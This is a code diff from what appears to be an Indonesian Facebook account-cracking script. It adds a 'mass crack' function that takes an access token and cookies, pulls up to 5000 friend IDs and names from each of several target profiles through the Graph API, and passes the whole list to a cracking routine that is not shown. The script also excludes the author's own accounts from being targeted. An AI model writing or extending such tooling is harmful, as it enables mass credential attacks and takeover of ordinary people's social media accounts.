@@ -305,13 +305,7 @@ def pilih(token,coki):
 	elif slut in['1','01']:
 		PublikGRAPH(token,coki)
 	elif slut in['2','02']:
-		gan = input ("%s╰─%s anda ingin crack massal id? y/t%s >%s "%(P,H,M,K))
-		if gan in['']:
-			exit ('%s╰─%s isi yang benar'%(P,M));jeda(2)
-		elif gan in['y','Y']:
-			MassalPublikGRAPH(token,coki)
-		elif gan in['t','T']:
-			PublikGRAPH(token,coki)
+		MassalPublikGRAPH(token,coki)
 	elif slut in['3','03']:
 		FollowGRAPH(token,coki)
 	elif slut in['4','04']:
@@ -357,6 +351,33 @@ def PublikGRAPH(token,cookie):
 		exit("\n%s GAGAL %smengambil usename/ID....."%(M,P))
 		
 	return Crack().romiy(id)
+	
+#--- CRACK UNLILMITED
+def MassalPublikGRAPH(token,cookie):
+	try:
+		jum = int(input('%s╰─ %sjumlah target %s > %s'%(p,o,m,k)))
+	except:jum=1
+	tulis(Panel(f"{Te}{U} {til}{O} Pastikan daftar teman target publik ",style='#FF0022'))
+	for t in range(jum):
+		t +=1
+		try:
+			try:
+				user = input('%s╰─ %susername/ID publik %s%s%s > %s'%(p,o,p,t,m,k))
+				if user in['100067807565861','100028434880529','romi.afrizal.102','romi.alfarabi','']:
+					exit('%s╰─%s gak usah tolol'%(p,m))
+			except AttributeError:
+				exit('%s╰─%s %s tidak di temukan'%(p,m,user))
+			else:
+				uid = converter(user)
+				po = requests.get(f"https://graph.facebook.com/v13.0/{uid.get('uid')}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
+				for i in po['friends']['data']:
+					id.append(f"{i['id']}<=>{i['name']}")
+		except KeyError:
+			exit('%s╰─%s gagal mengambil ID'%(p,m))
+	print (f'\r{p}╰─{o} mengumpulkan id{m} >{h} {len(id)} ')
+	
+	return Crack().romiy(id)
+
 
  # CRACK FOLOWERS 
 def FollowGRAPH(token,cookie):
